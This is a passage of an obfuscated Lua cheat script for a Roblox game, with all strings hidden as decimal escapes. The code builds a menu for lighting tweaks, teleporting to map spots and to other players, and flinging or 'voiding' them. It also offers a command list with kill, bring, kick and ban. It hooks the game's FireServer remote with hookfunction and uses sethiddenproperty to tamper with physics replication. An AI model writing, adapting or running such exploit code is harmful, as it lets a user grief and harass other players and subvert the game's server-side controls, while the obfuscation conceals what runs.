_llIIIIlIlI(_IIIIIIIIlI.SS, B.SS, frac) local _llIIIlIlll = _IIIIIIllIl:FindFirstChild("\065\117\116\111\083\107\121\066\108\111\111\109") if _llIIIlIlll then pcall( function () _llIIIlIlll:Destroy() end
 ) end
 local _IllIIlIllI = _IIIIIIllIl:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if not _IllIIlIllI then _IllIIlIllI = Instance.new("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") _IllIIlIllI.Name = "\065\117\116\111\083\107\121\067\067" _IllIIlIllI.Parent = _IIIIIIllIl end
 _IllIIlIllI.Brightness = _llIIIIlIlI(_IIIIIIIIlI.CCB, B.CCB, frac) _IllIIlIllI.Contrast = _llIIIIlIlI(_IIIIIIIIlI.CCC, B.CCC, frac) _IllIIlIllI.Saturation = _llIIIIlIlI(_IIIIIIIIlI.CCS, B.CCS, frac) _IllIIlIllI.TintColor = _IIIIIIIIlI.CCT:Lerp(B.CCT, frac) _IllIIlIllI.Enabled = true local _IllIllllIl = _IIIIIIllIl:FindFirstChildOfClass("\083\107\121") if _IllIllllIl then local _llIIlIIlII = getgenv()._lightingPresetOrig if _llIIlIIlII and _llIIlIIlII.MoonAngularSize then _IllIllllIl.MoonAngularSize = _llIIlIIlII.MoonAngularSize end
 if _llIIlIIlII and _llIIlIIlII.SunAngularSize then _IllIllllIl.SunAngularSize = _llIIlIIlII.SunAngularSize end
 end
 end
 end
 if _IIlIlIIlII == "\078\111\110\101" then getgenv()._lightingPresetLoop = false getgenv()._tzLoopActive = false if getgenv()._lightingPresetConns then for _lIIlIllIlI, _IlIlIllIll in ipairs(getgenv()._lightingPresetConns) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 getgenv()._lightingPresetConns = {} end
 _lIlIlIlIII() pcall( function () workspace.Terrain.Clouds.Enabled = true end
 ) else _IIIllIlIII() pcall( function () workspace.Terrain.Clouds.Enabled = false end
 ) _llIlIlllIl(_IIlIlIIlII) if not getgenv()._lightingPresetLoop then getgenv()._lightingPresetLoop = true getgenv()._lightingPresetConns = {} local _IIlIIIIIll = false local function _lIIlIlllII() if _IIlIIIIIll or not getgenv()._lightingPresetLoop then return end
 local _IlIlllllIl = _lIIlIllIlI.LightingPreset.Value if _IlIlllllIl == "\078\111\110\101" then return end
 _IIlIIIIIll = true _llIlIlllIl(_IlIlllllIl) _IIlIIIIIll = false end
 local _IlIlIlIIII = { ClockTime=true, Brightness=true, ExposureCompensation=true, Ambient=true, OutdoorAmbient=true, FogColor=true, FogStart=true, FogEnd=true, GeographicLatitude=true, ShadowSoftness=true, GlobalShadows=true, EnvironmentDiffuseScale=true, EnvironmentSpecularScale=true, Technology=true, } table.insert(getgenv()._lightingPresetConns, _IIIIIIllIl.Changed:Connect( function (prop) if _IlIlIlIIII[prop] then _lIIlIlllII() end
 end
 ) ) local function _lIllllllIl(atmo) if not atmo then return end
 table.insert(getgenv()._lightingPresetConns, atmo.Changed:Connect( function () _lIIlIlllII() end
 ) ) end
 _lIllllllIl(_IIIIIIllIl:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101")) table.insert(getgenv()._lightingPresetConns, _IIIIIIllIl.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII:IsA("\065\116\109\111\115\112\104\101\114\101") then _lIllllllIl(_IIIlIIIlII) end
 end
 ) ) table.insert(getgenv()._lightingPresetConns, game:GetService("\080\108\097\121\101\114\115").LocalPlayer.CharacterAdded:Connect( function () task.wait(0x0) _lIIlIlllII() end
 ) ) end
 if _IIlIlIIlII == "\065\117\116\111\045\083\107\121" then getgenv()._tzLoopActive = true task.spawn( function () while getgenv()._tzLoopActive and getgenv()._lightingPresetLoop and not _IIIllIIlll.Unloaded do if _lIIlIllIlI.LightingPreset and _lIIlIllIlI.LightingPreset.Value == "\065\117\116\111\045\083\107\121" then _IIlIIIIIll = true pcall(_llIlIlllIl, "\065\117\116\111\045\083\107\121") _IIlIIIIIll = false else break end
 task.wait(0x1) end
 getgenv()._tzLoopActive = false end
 ) end
 end
 end
 , }) _llIlIIlIIl:AddDropdown("\076\105\103\104\116\105\110\103\084\101\099\104\110\111\108\111\103\121", { Text = "\076\105\103\104\116\105\110\103\032\084\101\099\104\110\111\108\111\103\121", Values = {"\085\110\105\102\105\101\100", "\070\117\116\117\114\101", "\083\104\097\100\111\119\077\097\112", "\086\111\120\101\108", "\067\111\109\112\097\116\105\098\105\108\105\116\121"}, Default = "\085\110\105\102\105\101\100", Callback = function (_IIlIlIIlII) local _llIlIlllll = { ["\085\110\105\102\105\101\100"] = Enum.Technology.Unified, ["\070\117\116\117\114\101"] = Enum.Technology.Future, ["\083\104\097\100\111\119\077\097\112"] = Enum.Technology.ShadowMap, ["\086\111\120\101\108"] = Enum.Technology.Voxel, ["\067\111\109\112\097\116\105\098\105\108\105\116\121"] = Enum.Technology.Compatibility, } pcall( function () _IIIIIIllIl.Technology = _llIlIlllll[_IIlIlIIlII] or Enum.Technology.Unified end
 ) end
 , }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.NoWalls:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoTrees:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoDebris:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoSmoke:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoExplosions:SetValue(false) end
 ) pcall( function () _llIIllIlll.AmbientEnabled:SetValue(false) end
 ) pcall( function () _llIIllIlll.RainbowAmbient:SetValue(false) end
 ) pcall( function () _lIIlIllIlI.LightingPreset:SetValue("\078\111\110\101") end
 ) getgenv()._lightingPresetLoop = false local _IIIlllIlII = workspace:FindFirstChild("\077\097\112") if _IIIlllIlII then for _lIIlIllIlI, _IlIlIllIll in pairs(_IIIlIllIIl:GetChildren()) do pcall( function () _IlIlIllIll.Parent = _IIIlllIlII end
 ) end
 local _llIIlIIlII = _IIIlllIlII:FindFirstChild("\084\114\101\101\115") if _llIIlIIlII then for _lIIlIllIlI, _IlIlIllIll in pairs(_IlIIlIIlIl:GetChildren()) do pcall( function () _IlIlIllIll.Parent = _llIIlIIlII end
 ) end
 end
 end
 end
 ) end
 local _IlIIllIlII = { ["\065\098\111\118\101\032\084\117\110\110\101\108"] = CFrame.new(-0x12D, 0x252, -0x142), ["\065\114\101\110\097"] = CFrame.new(-0x82, 0x1B8, -0x175), ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), ["\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"]= CFrame.new(-0x2A, 0x5BD, 0x628B), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"]= CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), ["\074\097\105\108"] = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"]= CFrame.new(0x14, 0x1B7, -0x1CC), ["\077\105\100\100\108\101"] = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), ["\086\111\105\100"] = CFrame.new(0x0, -0x2710, 0x0), } local _IIIllIIlIl = {} for _llIlIIIllI in pairs(_IlIIllIlII) do _IIIllIIlIl[#_IIIllIIlIl+0x1] = _llIlIIIllI end
 table.sort(_IIIllIIlIl) local function _IllIIIIIIl(_IlIIIIIlII) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllIIlllI and _lIlIllIlIl) then return end
 task.spawn( function () RunService.RenderStepped:Once( function () _lIlIllIlIl.Velocity = Vector3.new() RunService.Heartbeat:Wait() _lIlIllIlIl.Velocity = Vector3.new() end
 ) RunService.Heartbeat:Once( function () _lIlIllIlIl.CFrame = _IlIIIIIlII end
 ) end
 ) end
 local _lIIIIlIlIl = _lIIIlIIIlI.Map:AddLeftGroupbox("\084\101\108\101\112\111\114\116\115", "\109\097\112\045\112\105\110") local _lIlIllIIIl = _lIIIlIIIlI.Map:AddRightGroupbox("\080\108\097\121\101\114\115", "\117\115\101\114\115") if _lIIIIIIllI[_llIIlIIIlI] then for _lIIlIllIlI, locName in ipairs(_IIIllIIlIl) do _lIIIIlIlIl:AddButton({ Text = locName, Func = function () _IllIIIIIIl(_IlIIllIlII[locName]) end
 , }) if locName == "\077\105\100\100\108\101" then _lIIIIlIlIl:AddButton({ Text = "\087\101\097\107\101\115\116\032\068\117\109\109\121", Func = function () local _IIIlIIllll = workspace:FindFirstChild("\076\105\118\101") local _IlIIllIlll = _IIIlIIllll and _IIIlIIllll:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _lIlllllIlI = _IlIIllIlll and (_IlIIllIlll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IlIIllIlll.PrimaryPart) if _lIlllllIlI then _IllIIIIIIl(_lIlllllIlI.CFrame) end
 end
 , }) end
 end
 else _lIIIIlIlIl:AddButton({ Text = "\086\111\105\100", Func = function () _IllIIIIIIl(_IlIIllIlII["\086\111\105\100"]) end
 , }) end
 local _IlIlIIIIII = nil local function _IllIlIIIlI() local _IllIIlIllI = {} for _lIIlIllIlI, _lIllllllII in pairs(Players:GetPlayers()) do if _lIllllllII ~= _llIlIIlIll then _IllIIlIllI[#_IllIIlIllI+0x1] = _IIIlIllIlI(_lIllllllII) end
 end
 return _IllIIlIllI end
 local _IIlIlIIlll = _lIlIllIIIl:AddDropdown("\077\097\112\084\097\114\103\101\116\080\108\097\121\101\114", { Values = _IllIlIIIlI(), Text = "\084\097\114\103\101\116\032\080\108\097\121\101\114", Default = "", Searchable = true, AllowNull = true, }) local _lIIlIIIIlI = _lIlIllIIIl:AddButton({ Text = "\071\111\116\111", Func = function () if not _IlIlIIIIII then return end
 local _IIIlIIIlIl = _IlIlIIIIII.Character local _lIlIllIIIl = _IIIlIIIlIl and _IIIlIIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIlIl and _lIlIllIIIl then _IllIIIIIIl(_lIlIllIIIl.CFrame) end
 end
 , }) pcall( function () _lIIlIIIIlI:SetVisible(false) end
 ) local _lIIlIllllI = _lIlIllIIIl:AddButton({ Text = "\070\108\105\110\103", Func = function () if not _IlIlIIIIII then return end
 if _llllIlllll then return end
 local _IIIIlllIll = _IlIlIIIIII local _lIllIIIIlI = _lIIlIllIlI.CmdFlingMethod and _lIIlIllIlI.CmdFlingMethod.Value or "\086\111\105\100" task.spawn( function () _llllIlllll = true if not _IIIllIIlll then _IIIIIlllll(_IIIIlllIll) end
 _llllIIlIll(_IIIIlllIll) _llllIlllll = false if not _IIIllIIlll then _IIIIllIIlI() end
 end
 ) end
 , }) pcall( function () _lIIlIllllI:SetVisible(false) end
 ) local _IllIIIllIl = false local function _lIlIIlIIll() if _IllIIIllIl then return end
 _IllIIIllIl = true task.defer( function () pcall( function () _IIlIlIIlll:SetValues(_IllIlIIIlI()) end
 ) _IllIIIllIl = false end
 ) end
 local _IlIIlIlIlI = Players.PlayerAdded:Connect(_lIlIIlIIll) local _llIlIIIlIl = Players.PlayerRemoving:Connect( function () task.wait() _lIlIIlIIll() end
 ) local _IIlIIlIIll = "" _IIlIlIIlll:OnChanged( function (_lIIIIllIIl) if _lIIIIllIIl ~= "" and _lIIIIllIIl == _IIlIIlIIll then pcall( function () _IIlIlIIlll:SetValue("") end
 ) _IIlIIlIIll = "" _IlIlIIIIII = nil pcall( function () _lIIlIIIIlI:SetVisible(false) end
 ) pcall( function () _lIIlIllllI:SetVisible(false) end
 ) return end
 _IIlIIlIIll = _lIIIIllIIl or "" if not _lIIIIllIIl or _lIIIIllIIl == "" then _IlIlIIIIII = nil pcall( function () _lIIlIIIIlI:SetVisible(false) end
 ) pcall( function () _lIIlIllllI:SetVisible(false) end
 ) return end
 _IlIlIIIIII = _IIllllIllI(_lIIIIllIIl) pcall( function () _lIIlIIIIlI:SetVisible(_IlIlIIIIII ~= nil) end
 ) pcall( function () _lIIlIllllI:SetVisible(_IlIlIIIIII ~= nil) end
 ) end
 ) getgenv().ChromosomeActive = false local function _lIllIIIlll() local _llIlIIlIll = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local function _lIIIIIIIIl() local _IIllIIlllI = _llIlIIlIll.Character or _llIlIIlIll.CharacterAdded:Wait() return _IIllIIlllI:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x5) end
 local _llllIlIIIl = _lIIIIIIIIl() if _llllIlIIIl and typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then local _lIlIIIllIl _lIlIIIllIl = hookfunction(_llllIlIIIl.FireServer, function (self, ...) local _IIIllllIlI = {...} if getgenv().ChromosomeActive and type(_IIIllllIlI[0x1]) == "\116\097\098\108\101" and _IIIllllIlI[0x1].Goal == "\076\101\102\116\067\108\105\099\107\082\101\108\101\097\115\101" then return nil end
 return _lIlIIIllIl(self, ...) end
 ) end
 end
 _lIllIIIlll() getgenv().addchromosome = function () getgenv().ChromosomeActive = true end
 getgenv().removechromosome = function () getgenv().ChromosomeActive = false end
 local _IIIIIIIIII = _lIIIlIIIlI.ChangeLogs:AddLeftGroupbox("\072\121\112\101\114\084\101\097\109", "\099\114\111\119\110") _IIIIIIIIII:AddLabel("\079\119\110\101\114\058\032\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\057\050\054\057\102\097\092\034\062\097\114\105\115\116\111\111\101\121\060\047\102\111\110\116\062\092\110\092\110\066\097\100\032\098\097\099\111\110\058\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\056\066\052\053\049\051\092\034\062\098\097\099\111\110\098\097\099\111\110\101\100\060\047\102\111\110\116\062\058\032\083\105\103\109\097\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\049\065\052\070\066\070\092\034\062\115\101\099\114\101\116\120\118\046\060\047\102\111\110\116\062\058\032\080\104\097\110\116\097\115\109\032\083\111\117\114\099\101\032\097\110\100\032\065\117\116\104\111\114\105\122\097\116\105\111\110\032\102\111\114\032\117\115\101\046\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\070\070\051\051\051\051\092\034\062\105\046\097\109\046\097\110\046\097\103\101\110\116\060\047\102\111\110\116\062\058\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\081\117\111\116\101\115\032\040\116\117\102\102\041", true) getgenv()._disguiseAutoApply = nil do _IIIlIIlllI = false _disguise_applying = false _disguise_random_cooldown = false _IIlIIIIIII = {} _disguise_cache = {} _disguise_allowed_cache = {} _llIlIIllII = nil _disguise_spawn_conn = nil _disguise_maintain_conn = nil _IIlIIIIIII = nil _disguise_attr_char_conn = nil _disguise_presets = { 0x114079B7, 0x65C99AF7, 0x2E13C, 0x8904336B, 0x21F91DFD5, 0x1393717C3, 0x20052A3C6, 0x16614DA20, 0x76F8FF9, 0x12B32C5A2, 0x12A7A6306, 0x21DB977CB, 0x1AE93999E, 0x9384A32A, 0xB911C4B1, 0xC6D55B40, 0xC1A0050, 0x9AC07BB0, 0xBFCEA25, 0x761EB644, 0xDE652089, 0xC3E72C1, 0x1BA6A3EA9, 0x1839BAAC, 0x1B8474, 0x230AF8190, 0x510DD5D4, 0xB39619B2, 0x86B6ABB1, 0xB4150FD, 0x86D0A3F1, 0x1E27B6811, 0x24DBAD226, 0x16A410CE6, 0x88041F0D, 0x7403C7FF, 0x2758D244, 0x4312241D, 0xB3EC4A67, 0x8958B0A, 0xD53EEE52, 0x783F1958, 0xCF10AD60, 0x21FBA7632, 0x6369A1FA, 0x22A00FCCB, 0x13FDE5BED, 0x1EC9ED77C, 0x10E09EA4, 0x61301474, 0x10744D251, 0x14826C23, 0x63C370, 0x1C6691DE0, 0x418C2020, 0x4778A2B5, 0x51A6237E, 0xD805C80B, 0x8AFD131, 0xCDB7B17, 0x8675B73C, 0x1B4E8970F, 0x1F4709EF, 0x103F293F, 0xF46F5280, 0x121DEF563, 0x437E247E, 0x13698BB1C, 0xC691A6D6, 0x9C13FAC7, 0xFA70AA2D, 0x8C611E3, 0x29F7482B, 0x1BC31CF0, 0xF306263, 0x1E0F396AA, 0x9DBF2909, 0x15DC7212, 0xABF99373, } end
 local _lIIlIIIlII = _lIIIlIIIlI.ChangeLogs:AddRightGroupbox("\073\110\102\111", "\105\110\102\111") _lIIlIIIlII:AddLabel("\118\101\114\115\105\111\110\058\032\118\050\056\047\048\054\047\050\048\050\054", true) _lIIlIIIlII:AddDivider() _lIIlIIIlII:AddLabel("\084\111\032\114\101\112\111\114\116\032\105\115\115\117\101\115\044\032\114\101\097\099\104\032\111\117\116\032\118\105\097\032\068\105\115\099\111\114\100\046", true) _lIIlIIIlII:AddButton({ Text = "\067\111\112\121\032\068\105\115\099\111\114\100\032\083\101\114\118\101\114", Func = function () pcall( function () setclipboard("\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\103\103\047\084\089\100\083\077\109\081\097\070\057") end
 ) _IIIllIIlll:Notify({ Title = _IlIIIlllII("\100\105\115\099\111\114\100\032\115\101\114\118\101\114"), Content = "\099\111\112\105\101\100\032\116\111\032\099\108\105\112\098\111\097\114\100\033\033", _IlllIlIllI = 0x4 }) end
 , }) local _IlllIlIIIl = _lIIIlIIIlI.Settings:AddLeftGroupbox("\083\101\116\116\105\110\103\115", "\115\108\105\100\101\114\115\045\104\111\114\105\122\111\110\116\097\108") local _llllIlllIl = _lIIIlIIIlI.Settings:AddRightGroupbox("\077\101\110\117", "\108\097\121\111\117\116\045\100\097\115\104\098\111\097\114\100") _IlllIlIIIl:AddDropdown("\078\111\116\105\102\105\099\097\116\105\111\110\083\105\100\101", { Values = { "\076\101\102\116", "\082\105\103\104\116" }, Default = "\082\105\103\104\116", Text = "\078\111\116\105\102\105\099\097\116\105\111\110\032\083\105\100\101", Callback = function (Value) _IIIllIIlll:SetNotifySide(Value) end
 , }) _llllIlllIl:AddLabel("\077\101\110\117\032\066\105\110\100") :AddKeyPicker("\077\101\110\117\075\101\121\098\105\110\100", { Default = "\076\101\102\116\065\108\116", NoUI = true, Text = "\084\111\103\103\108\101\032\077\101\110\117" }) _IIIllIIlll.ToggleKeybind = _lIIlIllIlI.MenuKeybind _IlllIlIIIl:AddDivider() _IlllIlIIIl:AddToggle("\075\101\121\098\105\110\100\077\101\110\117\079\112\101\110", { Text = "\083\104\111\119\032\075\101\121\098\105\110\100\115", Default = _IIIllIIlll.KeybindFrame.Visible, Tooltip = "\083\104\111\119\115\032\111\110\045\115\099\114\101\101\110\032\107\101\121\098\105\110\100\032\098\117\116\116\111\110\115\046\032\085\115\101\102\117\108\032\102\111\114\032\109\111\098\105\108\101\046", Callback = function (_IIlIlIIlII) _IIIllIIlll.KeybindFrame.Visible = _IIlIlIIlII end
 , }) task.spawn( function () if _IlllIIllII.TouchEnabled and not _IlllIIllII.KeyboardEnabled then if _IIIllIIlll.KeybindFrame then _IIIllIIlll.KeybindFrame.Visible = true end
 pcall( function () _llIIllIlll.KeybindMenuOpen:SetValue(true) end
 ) task.wait(0x8) _IIIllIIlll:Notify({ Title = "\090\075\065\089\084\083\066", Content = "\077\111\098\105\108\101\032\100\101\118\105\099\101\032\100\101\116\101\099\116\101\100\046\032\084\111\032\104\105\100\101\032\111\110\045\115\099\114\101\101\110\032\107\101\121\098\105\110\100\115\044\032\110\097\118\105\103\097\116\101\032\116\111\032\083\101\116\116\105\110\103\115\032\097\110\100\032\100\105\115\097\098\108\101\032\092\034\083\104\111\119\032\075\101\121\098\105\110\100\115\092\034\046", _IlllIlIllI = 0xC, }) end
 end
 ) do local _lIlIIllIII = {} local _IllIIlIlIl = {} local _IlllllIllI = { goto = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", _lllIlIllll = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", to = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", fling = "\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", void = "\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", loopfling = "\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", loopvoid = "\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", unfling = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unvoid = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unloopfling = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unloopvoid = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", view = "\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125", spectate = "\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125", unview = "\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101", unspectate = "\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101", whitelist = "\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", addwhitelist = "\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", unwhitelist = "\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", removewhitelist = "\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", rejoin = "\114\101\106\111\105\110\047\114\106", rj = "\114\101\106\111\105\110\047\114\106", reset = "\114\101\115\101\116", fixcam = "\102\105\120\099\097\109", bring = "\098\114\105\110\103\032\123\112\108\097\121\101\114\125", kill = "\107\105\108\108\032\123\112\108\097\121\101\114\125", _IIllIllIIl = "\097\110\099\104\111\114\032\123\112\108\097\121\101\114\125", unanchor = "\117\110\097\110\099\104\111\114\032\123\112\108\097\121\101\114\125", sonic = "\115\111\110\105\099\032\123\112\108\097\121\101\114\125", ban = "\098\097\110\032\123\112\108\097\121\101\114\125", kick = "\107\105\099\107\032\123\112\108\097\121\101\114\125", unload = "\117\110\108\111\097\100\032\123\112\108\097\121\101\114\125", say = "\115\097\121\032\123\112\108\097\121\101\114\125\032\123\109\101\115\115\097\103\101\125", notify = "\110\111\116\105\102\121\032\123\109\101\115\115\097\103\101\125", listrevenantusers = "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", listrev = "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", } local function _lIlllIllIl(str) if not str then return nil end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if (_lIIlIIlllI.Name:lower():find("\094" .. str:lower()) or _lIIlIIlllI.DisplayName:lower():find("\094" .. str:lower())) and _lIIlIIlllI ~= _llIlIIlIll then return _lIIlIIlllI end
 end
 return nil end
 local function _IIlIIlIlIl(_lIIIIllIIl, aliases, _lllIIllIlI) _lIlIIllIII[_lIIIIllIIl] = _lllIIllIlI if aliases then for _lIIlIllIlI, alias in ipairs(aliases) do _IllIIlIlIl[alias] = _lllIIllIlI end
 end
 end
 local function _lIIIIIIllI(_lIIIIllIIl, _IIIllllIlI) local _lllIIllIlI = _lIlIIllIII[_lIIIIllIIl] or _IllIIlIlIl[_lIIIIllIIl] if _lllIIllIlI then _lllIIllIlI(_IIIllllIlI) end
 end
 local _IIlIlIIllI = false _IIlIIlIlIl("\103\111\116\111", {"\116\112", "\116\111"}, function (_IIIllllIlI) local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if not _IIIIlllIll and _IIIllllIlI[0x1] and _IIIllllIlI[0x1]:lower() == "\114\097\110\100\111\109" then local _IIlIllIlII = Players:GetPlayers() for _IIllIllIll = #_IIlIllIlII, 0x1, -0x1 do if _IIlIllIlII[_IIllIllIll] == _llIlIIlIll then table.remove(_IIlIllIlII, _IIllIllIll) end
 end
 _IIIIlllIll = _IIlIllIlII[math.random(0x1, #_IIlIllIlII)] end
 if _IIIIlllIll then local _IIllIIlllI = _IIIIlllIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllIIlllI and _lIlIllIlIl then local _IlIIIllIIl = _llIlIIlIll.Character local _llIllIIIII = _IlIIIllIIl and _IlIIIllIIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIllIIIII then local function _lIlIIIIIlI(_IIIlIIIIIl) if typeof(sethiddenproperty) == "\102\117\110\099\116\105\111\110" then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 pcall( function () _IIIlIIIIIl.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.RotVelocity = Vector3.zero end
 ) end
 RunService.Heartbeat:Wait() RunService.Heartbeat:Once( function () _lIlIIIIIlI(_llIllIIIII) _llIllIIIII.CFrame = _lIlIllIlIl.CFrame _lIlIIIIIlI(_llIllIIIII) task.spawn( function () for _lIIlIllIlI = 0x1, 0x4 do RunService.Heartbeat:Wait() local _IlllIIlIlI = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlllIIlIlI then _lIlIIIIIlI(_IlllIIlIlI) end
 end
 end
 ) end
 ) end
 end
 end
 end
 ) local _IlllIIIllI = nil _IIlIIlIlIl("\118\105\101\119", {"\115\112\101\099\116\097\116\101"}, function (_IIIllllIlI) local _IIIIlllIll = _lIlllIllIl(_IIIllllIlI[0x1]) if not _IIIIlllIll and _IIIllllIlI[0x1] and _IIIllllIlI[0x1]:lower() == "\114\097\110\100\111\109" then local _IIlIllIlII = Players:GetPlayers() for _IIllIllIll = #_IIlIllIlII, 0x1, -0x1 do if _IIlIllIlII[_IIllIllIll] == _llIlIIlIll then table.remove(_IIlIllIlII, _IIllIllIll) end
 end
 _IIIIlllIll = _IIlIllIlII[math.random(0x1, #_IIlIllIlII)] end
 if _IIIIlllIll then _IIIllIIlll:Notify({ Title = "\086\105\101\119\105\110\103", Content = _IIIIlllIll.DisplayName, _IlllIlIllI = 0x3 }) _IIIllIIlll = true _IIIIIlllll(_IIIIlllIll) if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 _IlllIIIllI = Players.PlayerRemoving:Connect( function (leavingPlayer) if leavingPlayer == _IIIIlllIll then _IIIllIIlll:Notify({ Title = "\067\111\109\109\097\110\100\032\066\097\114", Content = "\085\110\118\105\101\119\105\110\103\046\046", _IlllIlIllI = 0x3 }) if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 _IIIllIIlll = false _IllllIlIlI = false _IIIIllIIlI() end
 end
 ) end
 end
 ) _IIlIIlIlIl("\117\110\118\105\101\119", {"\117\110\115\112\101\099\116\097\116\101"}, function (_lIIlIllIlI) _IIIllIIlll:Notify({ Title = "\067\111\109\109\097\110\100\032\066\097\114", Content = "\085\110\118\105\101\119\105\110\103\046\046", _IlllIlIllI = 0x3 }) _IIIllIIlll = false _IIIIllIIlI() if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 end
 ) _IIlIIlIlIl("\114\101\106\111\105\110", {"\114\106"}, function (_lIIlIllIlI) local _lllIIllIIl = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local _lllIIIlIIl = game.PrivateServerId ~= '' or #Players:GetPlayers() <= 0x1 if _lllIIIlIIl then _llIlIIlIll:Kick("\082\101\106\111\105\110\105\110\103\046\046\046\046") task.wait() pcall( function () _lllIIllIIl:Teleport(game.PlaceId, _llIlIIlIll) end
 ) else _llIlIIlIll:Kick("\082\101\106\111\105\110\105\110\103\046\046\046\046") task.delay(0.1, function () pcall( function () _lllIIllIIl:TeleportToPlaceInstance(game.PlaceId, game.JobId, _llIlIIlIll) end
 ) end
 ) end
 end
 ) local function _lllIIlllII(_IIIIlllIll) _IlIlIlIIll[_IIIllIIlII(_IIIIlllIll)] = _IIIIlllIll return true end
